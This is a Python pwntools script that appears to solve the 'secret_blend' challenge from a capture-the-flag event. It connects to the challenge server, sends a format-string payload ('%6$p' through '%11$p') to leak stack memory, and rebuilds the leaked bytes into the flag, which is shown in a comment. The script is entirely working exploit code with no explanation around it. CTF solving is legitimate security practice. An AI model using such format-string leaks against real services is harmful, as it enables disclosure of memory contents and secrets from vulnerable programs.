#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./secret_blend", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals1.apoorvctf.xyz", 3003)

p.readuntil(b"have?\'\r\n")

p.send(b"%6$p.%7$p.%8$p.%9$p.%10$p.%11$p\r\n")

# not required locally
p.readuntil(b"\r\n")
p.readuntil(b"\r\n")

leaks = p.readline().decode().split(".")

flag = b""
for leak in leaks:
    flag += p64(int(leak, 16))

print(flag.decode()[:-3]) # apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}
